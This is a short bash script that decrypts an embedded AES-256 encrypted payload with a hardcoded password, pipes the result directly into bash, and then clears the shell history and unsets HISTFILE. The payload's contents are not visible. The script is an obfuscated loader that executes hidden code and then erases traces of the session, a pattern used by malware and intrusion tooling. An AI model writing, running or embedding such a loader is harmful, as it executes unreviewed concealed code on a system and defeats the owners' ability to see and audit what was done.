#!/bin/bash
ENC_DATA="U2FsdGVkX1/Vsur2WcEtEDQebEMAg7ldjS4+nZ4rq61k8tz6Nkez2kZpR56jqjno/F+iTbedBYzNnNJz+gf3cpC+vR/4ogKp0mVPxrAwhF5K/zqKr8of3f5NnkVvKIZ3NvernVB4yKpn30QqMDL/0SqtIE9eX5p4wq6bf0VsACEhXwCydbLxb6JpcuhtgajAsyeesHRPKu0KIALNAHTso45DAxjwL3LWqQfmr3NJybRcDRHjsK02DjaeHmiGwFzCkPbGI2j4Difs6RwbCJwK2IV7HnpTwa+UWdHAdj/+fY1/qyeJYcJOmh8C/wHAkC1pufnYUPD9jTQlDUu62KBzMGMgBE6syg9WepG8/AkmYaZLSjs1Zhe/MymxsStqkKt/Xr7V1qGCnXoC6YRSSjMtIYotBzG23l1vfdVMm0IW57vyaMuV4GsiRGn/wASgjKtfPwgcsdVMo6krjujU1n9IjwS0hx5P0JM7/2QhC1OmhPmcyMHQO3fknsfGHtUSuvqRKbkHc0xdbOn/OcnR+Zhpm13EMujrOZLOXt8KVM9DQsQDb0VYHBOBLVA/GM0IArLxU4KiIwuQPy/wPAZQnsOFFw=="

echo "$ENC_DATA" | openssl enc -aes-256-cbc -md sha256 -a -d -salt -pass pass:bismillah 2>/dev/null | bash

unset ENC_DATA
history -c && unset HISTFILE
